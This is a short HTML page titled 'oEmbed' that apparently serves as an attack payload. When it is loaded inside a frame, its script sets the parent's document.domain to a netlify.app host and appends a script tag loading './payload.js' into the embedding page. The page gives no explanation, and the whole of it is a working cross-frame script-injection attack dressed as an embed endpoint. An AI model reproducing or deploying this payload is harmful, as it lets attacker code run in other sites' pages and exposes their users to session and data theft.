<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>oEmbed</title>
</head>

<body>
    <script>

        function delivery() {
            parent.document.domain = "master--dainty-dusk-3f3151.netlify.app";
            var payload = parent.document.createElement('script');
            payload.src = './payload.js';
            parent.document.body.appendChild(payload);
        }

        this.top.location !== this.location && (delivery());
    </script>
